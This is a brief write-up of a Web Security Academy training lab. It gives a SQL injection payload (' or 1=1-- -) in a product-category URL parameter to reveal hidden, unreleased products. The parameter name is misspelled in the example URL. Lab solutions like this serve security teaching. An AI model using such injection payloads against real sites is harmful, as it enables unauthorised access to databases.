# Retrieving Hidden Data

### Objective

- Retrieve all products from the backend database, including unreleased products

### Solution

The `categories` query parameter is vulnerable to a basic SQL Injection vulnerability. The solution is to this is:

```
https://<random-id>.web-security-academy.net/products?catagories=Accessories' or 1=1-- -
```
